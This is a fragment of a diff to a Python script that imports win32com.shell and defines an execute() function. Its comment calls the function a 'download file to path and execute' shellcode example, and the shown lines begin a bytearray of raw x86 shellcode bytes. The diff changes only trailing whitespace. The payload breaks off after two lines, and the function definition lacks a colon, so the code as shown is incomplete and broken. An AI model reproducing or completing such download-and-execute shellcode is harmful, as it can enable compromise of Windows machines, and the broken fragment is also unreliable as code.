@@ -10,7 +10,7 @@ import win32com.shell.shell as shell
 
 # Main function.
 def execute()
-    # Download file to path and execute (shellcode example)
+    # Download file to path and execute (shellcode example) 
     shellcode = bytearray(
 	"\xdb\xc3\xd9\x74\x24\xf4\xbe\xe8\x5a\x27\x13\x5f\x31\xc9" 
 	"\xb1\x33\x31\x77\x17\x83\xc7\x04\x03\x9f\x49\xc5\xe6\xa3" 
